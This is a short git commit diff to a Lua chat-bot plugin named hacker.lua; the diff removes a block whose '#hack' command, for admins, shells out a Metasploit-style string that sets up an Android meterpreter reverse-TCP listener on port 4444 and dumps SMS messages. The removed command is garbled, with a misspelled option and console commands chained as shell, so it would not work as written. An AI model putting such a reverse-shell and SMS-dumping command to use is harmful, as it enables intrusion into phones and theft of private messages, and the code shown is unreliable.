06f13785288a4e14f1d7edd461f4c326af5a08fd
mahdisudo <mehdisudo@gmail.com>
2016-06-17 14:38:53 +0430

    Update hacker.lua

--- plugins/hacker.lua
+++ plugins/hacker.lua
@@ -12,16 +12,3 @@ return {
   run = run,
   moderated = true
 }
- function run(msg, matches)
-if is_admin(msg) then
-text = io.popen("use exploit/multi/handler && set PAYLOAD android/meterpreter/reverse_tcp && set LHSOT 0.0.0.0 && set LPORT 4444 && exploit && dump_sms"):read('*all')
-  return text
-end
-end
-return {
-patterns = {
-  '^[#/!]hack$'
-  },
-  run = run,
-  moderated = true
-}
